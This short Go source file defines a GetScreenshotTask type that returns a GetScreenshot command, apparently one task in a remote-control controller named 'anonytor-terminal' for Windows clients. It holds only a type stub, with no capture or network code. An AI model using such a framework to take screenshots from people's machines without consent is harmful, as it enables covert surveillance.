package windows

import (
	"anonytor-terminal/controller/task"
	"anonytor-terminal/runtime/definition"
)

type GetScreenshotTask struct {
	task.Base
}

func (t *GetScreenshotTask) GetCmdType() definition.CmdType {
	return definition.GetScreenshot
}
